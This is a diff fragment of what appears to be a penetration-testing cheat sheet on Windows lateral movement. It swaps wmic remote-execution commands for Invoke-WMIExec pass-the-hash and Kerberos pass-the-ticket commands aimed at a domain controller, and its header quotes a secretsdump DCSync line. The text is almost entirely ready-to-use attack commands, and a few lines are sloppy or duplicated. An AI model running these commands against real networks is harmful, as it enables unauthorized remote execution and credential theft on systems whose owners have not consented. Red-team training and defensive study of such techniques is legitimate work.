@@ -20,17 +20,17 @@ python secretsdump.py -hashes <NTLM Hash> -just-dc insomina.io/Administrator@192
 ### Windows Management Instrumentation
 
 ```
-wmic /node:"ComputerName" /user:"insomnia.io\john" /password:"1234567@" process call create "powershell -enc <>"
-WMIGrunt wkstn-4945 PowerShell insomnia\john 1234567@
-WMIGrunt wkstn-4945 PowerShell
+Invoke-WMIExec -Target john.insomnia -Domain insomnia.io -Username John  -Hash <NTLM Hash> -Command "ipconfig" -verbose
+Invoke-WMIExec -Target john.insomnia -Domain insomnia.io -Username John  -Hash <NTLM Hash> -Command "hostanme"
 
 ```
-### Pass the Ticket with Windows Management Instrumentation
+### Pass the Ticket Over WMI
 ```
-wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
-wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local path win32_process call create calc.exe
-wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local "cmd /c ipconfig"
-wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe"
+wmic /authority:"Kerberos: Domain Hostname / Hostname process call create 
+wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io path win32_process call create calc.exe
+wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io "cmd /c ipconfig"
+wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io "cmd /c ipconfig"
+
 ```
   ### PowerShell Remoting
  ```
